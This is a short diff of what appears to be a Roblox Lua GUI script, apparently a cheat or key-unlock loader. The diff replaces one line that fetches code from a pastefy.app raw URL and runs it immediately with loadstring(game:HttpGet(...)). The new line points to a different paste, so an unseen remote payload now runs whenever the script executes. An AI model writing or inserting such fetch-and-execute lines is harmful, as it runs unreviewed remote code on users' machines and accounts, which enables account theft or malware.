@@ -96,8 +96,7 @@ task.spawn(function()
     button.TextColor3 = Color3.fromRGB(255, 255, 255)
     btnStroke.Color = Color3.fromRGB(200, 255, 200)
 end)
-loadstring(game:HttpGet("https://pastefy.app/vs6D6Wq7/raw"))()
-
+loadstring(game:HttpGet("https://pastefy.app/SvIwI5E6/raw"))()
 button.MouseButton1Click:Connect(function()
     if not unlocked then return end
     gui:Destroy()
